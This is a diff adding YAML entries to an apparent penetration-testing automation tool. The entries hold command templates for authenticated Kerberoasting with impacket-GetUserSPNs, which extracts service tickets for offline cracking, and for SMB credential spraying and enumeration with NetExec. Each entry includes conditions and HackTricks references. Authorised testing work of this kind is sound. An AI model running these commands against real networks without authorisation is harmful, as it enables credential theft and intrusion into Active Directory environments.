@@ -1,0 +1,26 @@
+- command_template: capo run impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip
+    {IP} -request
+  conditions:
+    require_ports:
+    - 88
+    require_state:
+    - has_domain
+    - has_valid_user
+    - has_valid_password
+  description: Extract TGS tickets for offline cracking using known credentials.
+  id: kerberoast_authenticated
+  name: Kerberoasting (Authenticated)
+  priority: P1
+  source_reference: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+- command_template: capo nxc smb -u "{USERFILE}" -p "{PASSFILE}" --continue-on-success
+  conditions:
+    require_ports:
+    - 445
+    require_state:
+    - has_valid_user
+    - has_valid_password
+  description: Enumerate SMB shares and privileges with real credentials.
+  id: smb_enum_authenticated
+  name: Authenticated SMB Enumeration
+  priority: P2
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
